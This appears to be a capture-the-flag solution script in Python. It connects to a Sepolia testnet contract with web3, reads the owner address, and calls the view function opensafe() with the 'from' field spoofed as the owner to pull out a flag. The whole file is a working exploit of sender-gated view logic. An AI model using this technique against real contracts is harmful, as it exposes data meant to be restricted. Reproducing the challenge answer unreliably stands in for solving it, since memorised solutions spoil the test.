from web3 import Web3

RPC_URL = "https://eth-sepolia.public.blastapi.io"
CONTRACT_ADDRESS = "0x5e992854Bd912ae170b7b5b8a64323e4e5E0feAF"

ABI = [
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "opensafe",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }
]

web3 = Web3(Web3.HTTPProvider(RPC_URL))
contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

def get_flag():
    owner_address = contract.functions.owner().call()
    print(f"Owner address: {owner_address}")
    
    print("Exploiting vulnerability...")
    flag = contract.functions.opensafe().call({'from': owner_address})
    
    print(f"Flag: {flag}")
    return flag

if __name__ == "__main__":
    print(f"Connected to blockchain: {web3.is_connected()}")
    
    if web3.is_connected():
        get_flag()
    else:
        print("Cannot connect to blockchain. Check the RPC URL.")
